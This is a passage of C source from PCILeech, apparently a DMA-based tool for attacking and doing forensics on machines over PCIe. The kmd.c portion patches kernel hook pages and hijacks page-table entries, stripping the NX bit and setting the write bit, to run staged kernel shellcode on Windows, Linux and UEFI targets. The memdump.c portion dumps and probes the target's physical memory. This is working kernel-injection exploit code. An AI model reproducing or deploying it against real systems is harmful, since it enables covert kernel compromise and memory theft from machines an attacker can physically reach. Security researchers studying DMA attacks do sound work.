        }
        pSignature = &pSignatures[dwSignatureMatchIdx];
    }
    if(!pSignature->chunk[2].cb || !pSignature->chunk[3].cb) {
        printf("KMD: Failed. Error loading shellcode.\n");
        goto fail;
    }
    //------------------------------------------------
    // 3: Set up patch data.
    //------------------------------------------------
    ph1->qwPageAddr = pSignature->chunk[0].qwAddress;
    ph2->qwPageAddr = pSignature->chunk[1].qwAddress;
    ph1->dwPageOffset = 0xfff & pSignature->chunk[2].cbOffset;
    ph2->dwPageOffset = 0xfff & pSignature->chunk[3].cbOffset;
    DeviceReadDMA_Retry(ctxMain->hLC, ph1->qwPageAddr, 4096, ph1->pbOrig);
    DeviceReadDMA_Retry(ctxMain->hLC, ph2->qwPageAddr, 4096, ph2->pbOrig);
    memcpy(ph1->pbPatch, ph1->pbOrig, 4096);
    memcpy(ph2->pbPatch, ph2->pbOrig, 4096);
    memcpy(ph1->pbPatch + ph1->dwPageOffset, pSignature->chunk[2].pb, pSignature->chunk[2].cb);
    memcpy(ph2->pbPatch + ph2->dwPageOffset, pSignature->chunk[3].pb, pSignature->chunk[3].cb);
    // patch jump offset in stage1
    *(PDWORD)(ph1->pbPatch + ph1->dwPageOffset + STAGE1_OFFSET_CALL_ADD) += pSignature->chunk[3].cbOffset - pSignature->chunk[2].cbOffset;
    // patch original stage1 data in stage2 (needed for stage1 restore)
    memcpy(ph2->pbPatch + ph2->dwPageOffset + STAGE2_OFFSET_FN_STAGE1_ORIG, ph1->pbOrig + ph1->dwPageOffset, 8);
    // patch offset to extra function relative to stage2 entry point: windows = n/a, linux=kallsyms_lookup_name, mac=kernel_mach-o_header
    *(PDWORD)(ph2->pbPatch + ph2->dwPageOffset + STAGE2_OFFSET_EXTRADATA1) = pSignature->chunk[4].cbOffset - pSignature->chunk[3].cbOffset;
    //------------------------------------------------
    // 4: Write patched data to memory.
    //------------------------------------------------
    if(!DeviceWriteDMA_Verify(ctxMain->hLC, ph2->qwPageAddr, 4096, ph2->pbPatch)) {
        printf("KMD: Failed. Signature found but unable write #2.\n");
        goto fail;
    }
    if(!LcWrite(ctxMain->hLC, ph1->qwPageAddr, 4096, ph1->pbPatch)) { // stage1 (must be written after stage2)
        printf("KMD: Failed. Signature found but unable write #1.\n");
        goto fail;
    }
    printf("KMD: Code inserted into the kernel - Waiting to receive execution.\n");
    //------------------------------------------------
    // 5: wait for patch to reveive execution.
    //------------------------------------------------
    pdwPhysicalAddress = (PDWORD)(ph2->pbLatest + ph2->dwPageOffset + STAGE2_OFFSET_STAGE3_PHYSADDR);
    do {
        Sleep(100);
        if(!DeviceReadDMA_Retry(ctxMain->hLC, ph2->qwPageAddr, 4096, ph2->pbLatest)) {
            printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
            goto fail;
        }
    } while(!*pdwPhysicalAddress);
    printf("KMD: Execution received - continuing ...\n");
    //------------------------------------------------
    // 6: Restore hooks to original.
    //------------------------------------------------
    LcWrite(ctxMain->hLC, ph2->qwPageAddr, 4096, ph2->pbOrig);
    //------------------------------------------------
    // 7: Set up kernel module shellcode (stage3) and finish.
    //------------------------------------------------
    fResult = KMD_SetupStage3(*pdwPhysicalAddress, pSignature->chunk[4].pb, 4096);
fail:
    LocalFree(ph1);
    LocalFree(ph2);
    LocalFree(pSignature);
    return fResult;
}

_Success_(return)
BOOL KMDOpen_PageTableHijack()
{
    QWORD qwCR3 = ctxMain->cfg.paCR3;
    QWORD qwModuleBase;
    PSIGNATURE pSignature, pSignatures = NULL;
    DWORD cSignatures = CONFIG_MAX_SIGNATURES;
    PKMDHANDLE_S12 ph1 = NULL, ph2 = NULL;
    PSIGNATUREPTE pSignaturePTEs;
    QWORD cSignaturePTEs;
    PDWORD pdwPhysicalAddress;
    BOOL result, fResult = FALSE;
    if(!(ph1 = LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE_S12)))) { goto fail; }
    if(!(ph2 = LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE_S12)))) { goto fail; }
    if(!(pSignatures = LocalAlloc(LMEM_ZEROINIT, CONFIG_MAX_SIGNATURES * sizeof(SIGNATURE)))) { goto fail; }
    //------------------------------------------------
    // 1: Load signature and patch data.
    //------------------------------------------------
    result = Util_LoadSignatures(ctxMain->cfg.szKMDName, ".kmd", pSignatures, &cSignatures, 6);
    if(!result) {
        printf("KMD: Failed. Error loading signatures.\n");
        goto fail;
    }
    if(cSignatures != 1) {
        printf("KMD: Failed. Singature count differs from 1. Exactly one signature must be loaded.\n");
        goto fail;
    }
    pSignature = &pSignatures[0];
    if(pSignature->chunk[0].cb != 4096 || pSignature->chunk[1].cb != 4096) {
        printf("KMD: Failed. Signatures in PTE mode must be 4096 bytes long.\n");
        goto fail;
    }
    pSignaturePTEs = (PSIGNATUREPTE)pSignature->chunk[5].pb;
    cSignaturePTEs = pSignature->chunk[5].cb / sizeof(SIGNATUREPTE);
    //------------------------------------------------
    // 2: Locate patch location PTEs.
    //------------------------------------------------
    if(ctxMain->cfg.fPageTableScan) {
        printf("KMD: Searching for PTE location ...\n");
    }
    result = Util_PageTable_FindSignatureBase(&qwCR3, pSignaturePTEs, cSignaturePTEs, &qwModuleBase);
    if(!result) {
        printf("KMD: Failed. Could not find module base by PTE search.\n");
        goto fail;
    }
    result = Util_PageTable_ReadPTE(qwCR3, qwModuleBase + pSignature->chunk[2].cbOffset, &ph1->qwPTEOrig, &ph1->qwPTEAddrPhys);
    if(!result) {
        printf("KMD: Failed. Could not access PTE #1.\n");
        goto fail;
    }
    result = Util_PageTable_ReadPTE(qwCR3, qwModuleBase + pSignature->chunk[3].cbOffset, &ph2->qwPTEOrig, &ph2->qwPTEAddrPhys);
    if(!result) {
        printf("KMD: Failed. Could not access PTE #2.\n");
        goto fail;
    }
    //------------------------------------------------
    // 3: Set up patch data.
    //------------------------------------------------
    // hijack "random" page in memory if target page is above 4GB - dangerous!!!
    ph1->qwPageAddr = (ph1->qwPTEOrig < 0x100000000) ? (ph1->qwPTEOrig & 0xfffff000) : 0x90000;
    ph2->qwPageAddr = (ph2->qwPTEOrig < 0x100000000) ? (ph2->qwPTEOrig & 0xfffff000) : 0x91000;
    ph1->dwPageOffset = 0xfff & pSignature->chunk[2].cbOffset;
    ph2->dwPageOffset = 0xfff & pSignature->chunk[3].cbOffset;
    memcpy(ph1->pbPatch, pSignature->chunk[0].pb, 4096);
    memcpy(ph2->pbPatch, pSignature->chunk[1].pb, 4096);
    memcpy(ph1->pbPatch + ph1->dwPageOffset, pSignature->chunk[2].pb, pSignature->chunk[2].cb);
    memcpy(ph2->pbPatch + ph2->dwPageOffset, pSignature->chunk[3].pb, pSignature->chunk[3].cb);
    // patch jump offset in stage1
    *(PDWORD)(ph1->pbPatch + ph1->dwPageOffset + STAGE1_OFFSET_CALL_ADD) += pSignature->chunk[3].cbOffset - pSignature->chunk[2].cbOffset;
    // patch original stage1 data in stage2 (needed for stage1 restore)
    memcpy(ph2->pbPatch + ph2->dwPageOffset + STAGE2_OFFSET_FN_STAGE1_ORIG, pSignature->chunk[0].pb + ph1->dwPageOffset, 8);
    // patch offset to extra function relative to stage2 entry point: windows = n/a, linux=kallsyms_lookup_name
    *(PDWORD)(ph2->pbPatch + ph2->dwPageOffset + STAGE2_OFFSET_EXTRADATA1) = pSignature->chunk[4].cbOffset - pSignature->chunk[3].cbOffset;
    // calculate new PTEs
    ph1->qwPTE = 0x7ff0000000000fff & ph1->qwPTEOrig; // Strip NX-bit and previous physical address
    ph2->qwPTE = 0x7ff0000000000fff & ph2->qwPTEOrig; // Strip NX-bit and previous physical address
    ph1->qwPTE |= 0x00000002; // set write
    ph2->qwPTE |= 0x00000002; // set write
    ph1->qwPTE |= 0xfffff000 & ph1->qwPageAddr;
    ph2->qwPTE |= 0xfffff000 & ph2->qwPageAddr;
    //------------------------------------------------
    // 4: Write patched data and PTEs to memory.
    //------------------------------------------------
    LcRead(ctxMain->hLC, ph1->qwPageAddr, 4096, ph1->pbOrig);
    LcRead(ctxMain->hLC, ph2->qwPageAddr, 4096, ph2->pbOrig);
    if(!DeviceWriteDMA_Verify(ctxMain->hLC, ph2->qwPageAddr, 4096, ph2->pbPatch) ||
        !DeviceWriteDMA_Verify(ctxMain->hLC, ph1->qwPageAddr, 4096, ph1->pbPatch)) {
        printf("KMD: Failed. Signature found but unable write.\n");
        goto fail;
    }
    LcWrite(ctxMain->hLC, ph2->qwPTEAddrPhys, sizeof(QWORD), (PBYTE)&ph2->qwPTE);
    Sleep(250);
    LcWrite(ctxMain->hLC, ph1->qwPTEAddrPhys, sizeof(QWORD), (PBYTE)&ph1->qwPTE);
    //------------------------------------------------
    // 5: wait for patch to reveive execution.
    //------------------------------------------------
    printf("KMD: Page Table hijacked - Waiting to receive execution.\n");
    pdwPhysicalAddress = (PDWORD)(ph2->pbLatest + ph2->dwPageOffset + STAGE2_OFFSET_STAGE3_PHYSADDR);
    do {
        Sleep(100);
        if(!DeviceReadDMA_Retry(ctxMain->hLC, ph2->qwPageAddr, 4096, ph2->pbLatest)) {
            printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
            goto fail;
        }
    } while(!*pdwPhysicalAddress);
    printf("KMD: Execution received - continuing ...\n");
    //------------------------------------------------
    // 6: Restore hijacked memory pages.
    //------------------------------------------------
    LcWrite(ctxMain->hLC, ph1->qwPTEAddrPhys, sizeof(QWORD), (PBYTE)&ph1->qwPTEOrig);
    LcWrite(ctxMain->hLC, ph2->qwPTEAddrPhys, sizeof(QWORD), (PBYTE)&ph2->qwPTEOrig);
    Sleep(100);
    LcWrite(ctxMain->hLC, ph1->qwPageAddr, 4096, ph1->pbOrig);
    LcWrite(ctxMain->hLC, ph2->qwPageAddr, 4096, ph2->pbOrig);
    //------------------------------------------------
    // 7: Set up kernel module shellcode (stage3) and finish.
    //------------------------------------------------
    fResult = KMD_SetupStage3(*pdwPhysicalAddress, pSignature->chunk[4].pb, 4096);
fail:
    LocalFree(ph1);
    LocalFree(ph2);
    LocalFree(pSignatures);
    return fResult;
}

_Success_(return)
BOOL KMD_SetupStage3_FromPartial()
{
    BYTE pb[4096];
    DWORD cb;
    if(ctxMain->pk->OperatingSystem == KMDDATA_OPERATING_SYSTEM_LINUX) {
        return
            Util_ParseHexFileBuiltin("DEFAULT_LINUX_X64_STAGE3", pb, 4096, &cb) &&
            KMD_SetupStage3(ctxMain->phKMD->dwPageAddr32, pb, 4096);
    } else {
        printf("KMD: Failed. Not a valid KMD @ address: 0x%08x\n", ctxMain->phKMD->dwPageAddr32);
        return FALSE;
    }
}

_Success_(return)
BOOL KMDOpen_LoadExisting()
{
    //------------------------------------------------
    // 1: Set up handle to existing shellcode
    //------------------------------------------------
    ctxMain->phKMD = (PKMDHANDLE)LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE));
    if(!ctxMain->phKMD) { return FALSE; }
    ctxMain->phKMD->dwPageAddr32 = (DWORD)ctxMain->cfg.paKMD;
    ctxMain->pk = ctxMain->phKMD->pk = (PKMDDATA)ctxMain->phKMD->pbPageData;
    if(!DeviceReadDMA_Retry(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, 4096, ctxMain->phKMD->pbPageData)) {
        printf("KMD: Failed. Read failed @ address: 0x%08x\n", ctxMain->phKMD->dwPageAddr32);
        goto fail;
    }
    if(ctxMain->phKMD->pk->MAGIC == KMDDATA_MAGIC_PARTIAL) {
        return KMD_SetupStage3_FromPartial();
    }
    if(ctxMain->phKMD->pk->MAGIC != KMDDATA_MAGIC) {
        printf("KMD: Failed. Not a valid KMD @ address: 0x%08x\n", ctxMain->phKMD->dwPageAddr32);
        goto fail;
    }
    //------------------------------------------------
    // 2: Retrieve physical memory range map and complete open action.
    //------------------------------------------------
    if(!KMD_GetPhysicalMemoryMap()) {
        printf("KMD: Failed. Failed to retrieve physical memory map.\n");
        goto fail;
    }
    return TRUE;
fail:
    KMDClose();
    return FALSE;
}

_Success_(return)
BOOL KMDOpen()
{
    if(ctxMain->cfg.paKMD) {
        return KMDOpen_LoadExisting();
    } else if(ctxMain->cfg.paCR3 || ctxMain->cfg.fPageTableScan) {
        return KMDOpen_PageTableHijack();
    } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "WIN10_X64")) {
        return KMDOpen_HalHijack();
    } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "WIN10_X64_2")) {
        return KMDOpen_WINX64_2_VMM();
    } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "WIN10_X64_3")) {
        return KMDOpen_WINX64_3_VMM();
    } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "LINUX_X64_EFI")) {
        return KMDOpen_LinuxEfiRuntimeServicesHijack();
    } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "UEFI_EXIT_BOOT_SERVICES")) {
        return KMDOpen_UEFI(0xe8 /* ExitBootServices */);
    } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "UEFI_SIGNAL_EVENT")) {
        return KMDOpen_UEFI(0x68 /* ??? */);
    } else {
        return KMDOpen_MemoryScan();
    }
}

```

`pcileech/kmd.h`:

```h
// kmd.h : definitions related to operating systems kernel modules functionality.
//
// (c) Ulf Frisk, 2016-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#ifndef __KMD_H__
#define __KMD_H__
#include "pcileech.h"

/*
* Open a kernel module (KMD). This can be done in multiple ways as specified in
* the configuration data.
* -- return
*/
_Success_(return)
BOOL KMDOpen();

/*
* Unload an active kernel module from the target system and perform various
* cleanup tasks.
*/
VOID KMDUnload();

/*
* Clean up and free memory related to a kernel module without unloading the
* kernel module from the target system.
*/
VOID KMDClose();

/*
* Read physical memory from the target system using an active KMD as a proxy.
* -- qwAddress = physical address in target system to read.
* -- pb = pre-allocated buffer to place result in.
* -- cb = length of data to read, must not be larger than pb.
* -- return
*/
_Success_(return)
BOOL KMDReadMemory(_In_ QWORD qwAddress, _Out_ PBYTE pb, _In_ DWORD cb);

/*
* Write physical memory to the target system using an active KMD as a proxy.
* -- qwAddress = the physical address to write to in the target system.
* -- pb = bytes to write
* -- cb = number of bytes to write.
* -- return TRUE on success, otherwise FALSE.
*/
_Success_(return)
BOOL KMDWriteMemory(_In_ QWORD qwAddress, _In_ PBYTE pb, _In_ DWORD cb);

/*
* Submit a command to an already loaded kernel module.
* -- op = the command (opcode) to submit for processing.
* -- return TRUE on success, otherwise FALSE.
*/
_Success_(return)
BOOL KMD_SubmitCommand(_In_ QWORD op);

#endif /* __KMD_H__ */

```

`pcileech/memdump.c`:

```c
// memdump.c : implementation related to memory dumping functionality.
//
// (c) Ulf Frisk, 2016-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#include <leechcore.h>
#include "memdump.h"
#include "device.h"
#include "statistics.h"
#include "util.h"
#include "vmmx.h"
#include <vmmdll.h>
#ifdef WIN32
#include <io.h>
#endif /* WIN32 */

#define MEMDUMP_DATABUFFER_SIZE     0x01000000          // 16MB
#define MEMDUMP_4GB                 0x100000000
#define MEMDUMP_NUM_BUFFER          3


typedef struct tdMEMDUMP_FILEWRITE_DATA {
    QWORD paMin;
    QWORD pa;
    DWORD cb;
    BYTE pb[MEMDUMP_DATABUFFER_SIZE];
} MEMDUMP_FILEWRITE_DATA, *PMEMDUMP_FILEWRITE_DATA;

typedef struct tdMEMDUMP_FILEWRITE {
    FILE *hFile;
    BOOL fFileNone;
    BOOL fValid;
    BOOL fTerminated;
    QWORD iRead;    // index of reader thread
    QWORD iWrite;   // index of writer thread
    MEMDUMP_FILEWRITE_DATA Data[MEMDUMP_NUM_BUFFER];
} MEMDUMP_FILEWRITE, *PMEMDUMP_FILEWRITE;

VOID MemoryDump_SetOutFileName()
{
    SYSTEMTIME st;
    if(ctxMain->cfg.fOutFile && ctxMain->cfg.szFileOut[0] == 0) {
        GetLocalTime(&st);
        _snprintf_s(
            ctxMain->cfg.szFileOut,
            MAX_PATH,
            _TRUNCATE,
            "pcileech-%llx-%llx-%i%02i%02i-%02i%02i%02i.raw",
            ctxMain->cfg.paAddrMin,
            ctxMain->cfg.paAddrMax,
            st.wYear,
            st.wMonth,
            st.wDay,
            st.wHour,
            st.wMinute,
            st.wSecond);
    }
}

DWORD WINAPI MemoryDump_File_ThreadProc(_In_ PMEMDUMP_FILEWRITE ctx)
{
    PMEMDUMP_FILEWRITE_DATA pd;
    while(ctx->fValid) {
        if(ctx->iRead == ctx->iWrite) {
            Sleep(25);
            continue;
        }
        pd = &ctx->Data[ctx->iRead % MEMDUMP_NUM_BUFFER];
        _fseeki64(ctx->hFile, pd->pa - pd->paMin, SEEK_SET);
        if(pd->cb != fwrite(pd->pb, 1, pd->cb, ctx->hFile)) {
            printf("Memory Dump: Failed. Write to file.\n");
            break;
        }
        InterlockedIncrement64(&ctx->iRead);
    }
    ctx->fTerminated = TRUE;
    return 0;
}

VOID MemoryDump_File_Close(_Post_ptr_invalid_ PMEMDUMP_FILEWRITE pfw)
{
    pfw->fValid = FALSE;
    while(!pfw->fFileNone && !pfw->fTerminated) {
        Sleep(25);
    }
    if(pfw->hFile) { fclose(pfw->hFile); }
    LocalFree(pfw);
}

PMEMDUMP_FILEWRITE MemoryDump_File_Initialize(_In_ BOOL fAllocFile4GB)
{
    FILE *hFileTMP;
    HANDLE hThread;
    PMEMDUMP_FILEWRITE pfw;
    MemoryDump_SetOutFileName();
    if(!(pfw = LocalAlloc(LMEM_ZEROINIT, sizeof(MEMDUMP_FILEWRITE)))) {
        printf("Memory Dump: Failed. Out of memory.\n");
        goto fail;
    }
    if(0 == ctxMain->cfg.szFileOut[0]) {
        pfw->fFileNone = TRUE;
        return pfw;
    }
    if(!fopen_s(&hFileTMP, ctxMain->cfg.szFileOut, "r")) {
        fclose(hFileTMP);
        printf("Memory Dump: Failed. File already exists.\n");
        goto fail;
    }
    if(fopen_s(&pfw->hFile, ctxMain->cfg.szFileOut, "wb")) {
        printf("Memory Dump: Failed. Error writing to file.\n");
        goto fail;
    }
    if(fAllocFile4GB) {
        printf("Memory Dump: Initializing ...");
        if(_chsize_s(_fileno(pfw->hFile), MEMDUMP_4GB)) {
            printf("Memory Dump: Failed. Cannot set initial file size to 4GB for 'safer dump'.\n");
            goto fail;
        }
        printf(" Done.\n");
    }
    pfw->fValid = TRUE;
    if(!(hThread = CreateThread(NULL, 0, MemoryDump_File_ThreadProc, pfw, 0, NULL))) {
        printf("Memory Dump: Failed. Create Thread.\n");
        goto fail;
    }
    CloseHandle(hThread);
    return pfw;
fail:
    if(pfw) {
        if(pfw->hFile) { fclose(pfw->hFile); }
        LocalFree(pfw);
    }
    return NULL;
}

/*
* Dump memory with the kernel module (KMD) / USB3380 strategy - that is:
* - read chunks:
*      from zero (or user-specified value)
*      to to max supported memory (or specified by user)
*      in 16MB chunks.
* If the mode is USB3380 native a failed read for 16MB will stop the dumping.
*/
VOID ActionMemoryDump_KMD_USB3380()
{
    QWORD paCurrent, paMin, paMax;
    PMEMDUMP_FILEWRITE_DATA pd;
    PMEMDUMP_FILEWRITE pfw = NULL;
    PPAGE_STATISTICS pStat = NULL;
    // 1: Initialize result file, buffers and statistics:
    paMin = ctxMain->cfg.paAddrMin & ~0xfff;
    paMax = (ctxMain->cfg.paAddrMax + 1) & ~0xfff;
    if(!(pfw = MemoryDump_File_Initialize(FALSE))) { return; }
    PageStatInitialize(&pStat, paMin, paMax, "Dumping Memory", ctxMain->phKMD ? TRUE : FALSE, ctxMain->cfg.fVerbose);
    // 2: Dump memory in 16MB blocks:
    paCurrent = paMin;
    PageStatUpdate(pStat, paCurrent, 0, 0);
    while(!pfw->fTerminated && (paCurrent < paMax)) {
        if(!pfw->fFileNone && (pfw->iWrite >= pfw->iRead + 3)) {
            Sleep(25);
            continue;
        }
        pd = &pfw->Data[pfw->iWrite % MEMDUMP_NUM_BUFFER];
        pd->cb = (DWORD)min(MEMDUMP_DATABUFFER_SIZE, paMax - paCurrent);
        pd->pa = paCurrent;
        if(!Util_Read16M(pd->pb, paCurrent, pStat)) {
            printf("Memory Dump: Failed. Cannot dump any sequential data in 16MB - terminating.\n");
            goto fail;
        }
        InterlockedIncrement64(&pfw->iWrite);
        paCurrent += pd->cb;
    }
    PageStatClose(&pStat);
    if(!pfw->fTerminated) {
        printf("Memory Dump: Successful.\n");
    }
fail:
    PageStatClose(&pStat);
    MemoryDump_File_Close(pfw);
}

/*
* Dump memory with native mode strategy:
* If more than 4GB memory exists, dump memory above 4GB first and then start
* dumping between zero and 4GB - this to dump as much memory as possible before
* hitting problematic PCIe memory mapped devices between 3-4GB which commonly
* crashes computer when read ...
*/
VOID ActionMemoryDump_Native()
{
    BOOL fSaferDump;
    QWORD paCurrent, paMin, paMax;
    PMEMDUMP_FILEWRITE_DATA pd;
    PMEMDUMP_FILEWRITE pfw = NULL;
    PPAGE_STATISTICS pStat = NULL;
    // 1: Initialize result file, buffers and statistics:
    paMin = ctxMain->cfg.paAddrMin & ~0xfff;
    paMax = (ctxMain->cfg.paAddrMax + 1) & ~0xfff;
    fSaferDump = PCILEECH_DEVICE_EQUALS("fpga") && (paMin == 0) && (paMax > MEMDUMP_4GB);
    if(!(pfw = MemoryDump_File_Initialize(fSaferDump))) { return; }
    PageStatInitialize(&pStat, paMin, paMax, "Dumping Memory", FALSE, ctxMain->cfg.fVerbose);
    // 2: Dump memory in 16MB blocks:
    paCurrent = fSaferDump ? MEMDUMP_4GB : paMin;
    PageStatUpdate(pStat, paCurrent, 0, 0);
    while(!pfw->fTerminated) {
        if(!pfw->fFileNone && (pfw->iWrite >= pfw->iRead + 3)) {
            Sleep(25);
            continue;
        }
        pd = &pfw->Data[pfw->iWrite % MEMDUMP_NUM_BUFFER];
        pd->cb = (DWORD)min(MEMDUMP_DATABUFFER_SIZE, paMax - paCurrent);
        pd->pa = paCurrent;
        pd->paMin = paMin;
        ZeroMemory(pd->pb, pd->cb);
        DeviceReadDMA(pd->pa, pd->cb, pd->pb, pStat);
        InterlockedIncrement64(&pfw->iWrite);
        if(paMax == pd->pa + pd->cb) {
            if(fSaferDump) {
                paCurrent = 0;
                PageStatUpdate(pStat, paCurrent, 0, 0);
                continue;
            }
            break;
        }
        if(fSaferDump && (MEMDUMP_4GB == pd->pa + pd->cb)) {
            break;
        }
        paCurrent += pd->cb;
    }
    PageStatClose(&pStat);
    if(!pfw->fTerminated) {
        printf("Memory Dump: Successful.\n");
    }
    MemoryDump_File_Close(pfw);
}

VOID ActionMemoryDump()
{
    if(ctxMain->phKMD || PCILEECH_DEVICE_EQUALS("usb3380")) {
        ActionMemoryDump_KMD_USB3380();
    } else {
        ActionMemoryDump_Native();
    }
}

#define MEMORY_PROBE_PAGES_PER_SWEEP    0x1000

VOID ActionMemoryProbe()
{
    QWORD pa, i, cPages;
    PPAGE_STATISTICS pPageStat = NULL;
    PBYTE pbProbeResultMap = NULL;
    DWORD cbProbeResultMap;
    ctxMain->cfg.paAddrMin &= ~0xfff;
    ctxMain->cfg.paAddrMax = (ctxMain->cfg.paAddrMax + 1) & ~0xfff;
    pa = ctxMain->cfg.paAddrMin;
    PageStatInitialize(&pPageStat, ctxMain->cfg.paAddrMin, ctxMain->cfg.paAddrMax, "Probing Memory", FALSE, TRUE);
    while(pa < ctxMain->cfg.paAddrMax) {
        cPages = (DWORD)min(MEMORY_PROBE_PAGES_PER_SWEEP, (ctxMain->cfg.paAddrMax - pa) / 0x1000);
        if(!LcCommand(ctxMain->hLC, LC_CMD_FPGA_PROBE | cPages, sizeof(QWORD), (PBYTE)&pa, &pbProbeResultMap, &cbProbeResultMap) || (cPages > cbProbeResultMap)) {
            PageStatClose(&pPageStat);
            printf("Memory Probe: Failed. Unsupported device or other failure.\n");
            return;
        }
        for(i = 0; i < cPages; i++) {
            PageStatUpdate(pPageStat, (pa + i * 0x1000 + 0x1000), (pbProbeResultMap[i] ? 1 : 0), (pbProbeResultMap[i] ? 0 : 1));
        }
        pa += MEMORY_PROBE_PAGES_PER_SWEEP * 0x1000;
    }
    PageStatClose(&pPageStat);
    printf("Memory Probe: Completed.\n");
}

VOID ActionMemoryDisplayPhysical()
{
    QWORD qwAddrBase, qwAddrOffset, qwSize, qwSize_4kAlign;
    PBYTE pb;
    // allocate and calculate values
    pb = LocalAlloc(0, 0x10000);
    if(!pb) { return; }
    qwAddrBase = ctxMain->cfg.paAddrMin & 0x0fffffffffffff000;
    qwAddrOffset = ctxMain->cfg.paAddrMin & 0xff0;
    qwSize_4kAlign = SIZE_PAGE_ALIGN_4K(ctxMain->cfg.paAddrMax) - qwAddrBase;
    qwSize = ((ctxMain->cfg.paAddrMax + 0xf) & 0x0fffffffffffffff0) - (qwAddrBase + qwAddrOffset);
    if(qwSize_4kAlign > 0x10000 || (ctxMain->cfg.paAddrMax == ctxMain->dev.paMax)) {
        qwSize = 0x100;
        qwSize_4kAlign = (qwAddrOffset <= 0xf00) ? 0x1000 : 0x2000;
    }
    // read memory and display output
    if(!DeviceReadMEM(qwAddrBase, (DWORD)qwSize_4kAlign, pb, TRUE)) {
        printf("Memory Display: Failed reading memory at address: 0x%016llX.\n", qwAddrBase);
        LocalFree(pb);
        return;
    }
    printf("Memory Display: Contents for address: 0x%016llX\n", qwAddrBase);
    Util_PrintHexAscii(pb, (DWORD)(qwSize + qwAddrOffset), (DWORD)qwAddrOffset);
    LocalFree(pb);
}

VOID ActionMemoryDisplayVirtual()
{
    QWORD qwAddrBase, qwAddrOffset, qwSize, qwSize_4kAlign;
    PBYTE pb;
    // allocate and calculate values
    pb = LocalAlloc(0, 0x10000);
    if(!pb) { return; }
    qwAddrBase = ctxMain->cfg.vaAddrMin & 0x0fffffffffffff000;
    qwAddrOffset = ctxMain->cfg.vaAddrMin & 0xff0;
    qwSize_4kAlign = SIZE_PAGE_ALIGN_4K(ctxMain->cfg.vaAddrMax) - qwAddrBase;
    qwSize = ((ctxMain->cfg.vaAddrMax + 0xf) & 0x0fffffffffffffff0) - (qwAddrBase + qwAddrOffset);
    if(qwSize_4kAlign > 0x10000 || (ctxMain->cfg.vaAddrMax == ctxMain->dev.paMax)) {
        qwSize = 0x100;
        qwSize_4kAlign = (qwAddrOffset <= 0xf00) ? 0x1000 : 0x2000;
    }
    // initialize vmm/memprocfs
    if(!Vmmx_Initialize(FALSE, FALSE)) {
        printf("Memory Display: Failed. Unable to initialize virtual memory.\n");
        LocalFree(pb);
        return;
    }
    // read memory and display output
    if(!VMMDLL_MemRead(ctxMain->cfg.dwPID, qwAddrBase, pb, (DWORD)qwSize_4kAlign)) {
        printf("Memory Display: Failed reading memory at address: 0x%016llX.\n", qwAddrBase);
        LocalFree(pb);
        return;
    }
    printf("Memory Display: Contents for address: 0x%016llX\n", qwAddrBase);
    Util_PrintHexAscii(pb, (DWORD)(qwSize + qwAddrOffset), (DWORD)qwAddrOffset);
    LocalFree(pb);
}

VOID ActionMemoryPageDisplay()
{
    if(ctxMain->cfg.dwPID) {
        // virtual memory (Windows only):
        ctxMain->cfg.vaAddrMin = ctxMain->cfg.vaAddrMin & 0x0fffffffffffff000;
        ctxMain->cfg.vaAddrMax = ctxMain->cfg.vaAddrMin + 0x1000;
        ActionMemoryDisplayVirtual();
    } else {
        // physical memory
        ctxMain->cfg.paAddrMin = ctxMain->cfg.paAddrMin & 0x0fffffffffffff000;
        ctxMain->cfg.paAddrMax = ctxMain->cfg.paAddrMin + 0x1000;
        ActionMemoryDisplayPhysical();
    }
}

VOID ActionMemoryTestReadWrite()
{
    BYTE pb1[4096], pb2[4096], pb3[4096];
    DWORD dwAddrPci32 = (DWORD)(ctxMain->cfg.paAddrMin & 0xfffff000);
    DWORD i, dwOffset, dwRuns = 1000;
    BOOL r1, r2;
    if(ctxMain->phKMD) {
        printf("Memory Test Read: Failed. Memory test may not run in KMD mode.\n");
        return;
    }
    LcRead(ctxMain->hLC, dwAddrPci32, 4096, pb1);
    // READ DMA
    printf("Memory Test Read: starting, reading %i times from address: 0x%08x\n", dwRuns, dwAddrPci32);
    LcRead(ctxMain->hLC, dwAddrPci32, 4096, pb1);
    for(i = 0; i < dwRuns; i++) {
        r1 = LcRead(ctxMain->hLC, dwAddrPci32, 4096, pb2);
        if(!r1 || (dwOffset = Util_memcmpEx(pb1, pb2, 4096))) {
            printf("Memory Test Read: Failed. DMA failed / data changed by target computer / memory corruption. Read: %i. Run: %i. Offset: 0x%03x\n", r1, i, (r1 ? --dwOffset : 0));
            return;
        }
    }
    // WRITE DMA
    printf("Memory Test Read: SUCCESS!\n");
    if(ctxMain->cfg.tpAction == TESTMEMREADWRITE) {
        dwRuns = 100;
        printf("Memory Test Write: starting, reading/writing %i times from address: 0x%08x\n", dwRuns, dwAddrPci32);
        for(i = 0; i < dwRuns; i++) {
            Util_GenRandom(pb3, 4096);
            r1 = LcWrite(ctxMain->hLC, dwAddrPci32, 4096, pb3);
            r2 = LcRead(ctxMain->hLC, dwAddrPci32, 4096, pb2);
            if(!r1 || !r2 || (dwOffset = Util_memcmpEx(pb2, pb3, 4096))) {
                LcWrite(ctxMain->hLC, dwAddrPci32, 4096, pb1);
                printf("Memory Test Write: Failed. DMA failed / data changed by target computer / memory corruption. Write: %i. Read: %i. Run: %i. Offset: 0x%03x\n", r1, r2, i, --dwOffset);
                return;
            }
        }
        LcWrite(ctxMain->hLC, dwAddrPci32, 4096, pb1);
        printf("Memory Test Write: Success!\n");
    }
}

VOID ActionMemoryWrite()
{
    BOOL result;
    if(ctxMain->cfg.cbIn == 0) {
        printf("Memory Write: Failed. No data to write.\n");
        return;
    }
    if(ctxMain->cfg.cbIn > 0x01000000) {
        printf("Memory Write: Failed. Data too large: >16MB.\n");
        return;
    }
    if(ctxMain->cfg.fLoop) {
        printf("Memory Write: Starting loop write. Press CTRL+C to abort.\n");
    }
